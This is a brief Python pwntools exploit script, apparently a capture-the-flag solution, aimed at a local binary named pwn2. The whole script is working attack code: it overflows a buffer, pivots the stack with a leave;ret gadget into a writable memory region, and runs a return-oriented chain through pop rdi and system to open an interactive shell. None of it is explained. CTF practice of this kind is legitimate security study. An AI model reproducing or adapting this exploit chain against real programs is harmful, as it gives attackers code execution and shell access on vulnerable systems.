#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
r = process('/tmp/p/pwn2')

main_read = 0x400582
buf = 0x00602000 - 0x150
pop_rdi_ret = 0x0000000000400623 
leave_ret = 0x00000000004005b2
sh = 0x400645
system = 0x400430
pay1 = "a"*44 + p32(44) + flat([buf,main_read])
r.sendline(pay1)

pay2 = 'a'*7+flat([pop_rdi_ret, sh, system]) + 'a'*12 + p32(44) + flat([buf-0x30,leave_ret])
r.sendline(pay2) 

r.interactive()


